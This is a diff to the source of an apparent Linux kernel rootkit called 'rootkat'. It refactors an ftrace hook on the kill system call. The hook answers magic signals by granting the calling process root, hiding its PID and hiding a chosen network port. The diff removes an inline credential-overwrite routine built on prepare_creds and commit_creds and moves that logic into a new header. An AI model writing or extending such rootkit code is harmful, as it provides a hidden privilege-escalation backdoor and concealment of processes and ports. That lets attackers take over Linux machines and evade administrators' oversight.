@@ -1,12 +1,9 @@
 // SPDX-License-Identifier: MIT
-#include <linux/cred.h>
 #include <linux/kernel.h>
 #include <linux/sched.h>
-#include <linux/uidgid.h>
 #include <linux/ptrace.h>
 #include "ftrace_hook.h"
-#include "hidden_pids.h"
-#include "hidden_ports.h"
+#include "magic_actions.h"
 #include "hook_sys_kill.h"
 
 #define TAG "rootkat/hook_sys_kill: "
@@ -35,26 +32,6 @@ static struct rootkat_hook hook_sys_kill = {
 	.replacement = rootkat_sys_kill,
 };
 
-static void rootkat_grant_root(void)
-{
-	struct cred *new = prepare_creds();
-
-	if (!new) {
-		pr_warn(TAG "prepare_creds failed\n");
-		return;
-	}
-	new->uid   = GLOBAL_ROOT_UID;
-	new->gid   = GLOBAL_ROOT_GID;
-	new->euid  = GLOBAL_ROOT_UID;
-	new->egid  = GLOBAL_ROOT_GID;
-	new->suid  = GLOBAL_ROOT_UID;
-	new->sgid  = GLOBAL_ROOT_GID;
-	new->fsuid = GLOBAL_ROOT_UID;
-	new->fsgid = GLOBAL_ROOT_GID;
-	commit_creds(new);
-	pr_debug(TAG "elevated pid %d to root\n", task_pid_nr(current));
-}
-
 static long rootkat_sys_kill(const struct pt_regs *regs)
 {
 	sys_kill_t orig = (sys_kill_t)hook_sys_kill.original;
@@ -62,15 +39,15 @@ static long rootkat_sys_kill(const struct pt_regs *regs)
 	pid_t arg1 = (pid_t)regs->di;
 
 	if (sig == ROOTKAT_PRIVESC_SIG) {
-		rootkat_grant_root();
+		rootkat_grant_root_to_current();
 		return 0;
 	}
 	if (sig == ROOTKAT_HIDE_SIG) {
-		rootkat_hide_pid(task_pid_nr(current));
+		rootkat_hide_current_pid();
 		return 0;
 	}
 	if (sig == ROOTKAT_HIDE_PORT_SIG) {
-		rootkat_hide_port((u16)arg1);
+		rootkat_hide_port_from_current((u16)arg1);
 		return 0;
 	}
 
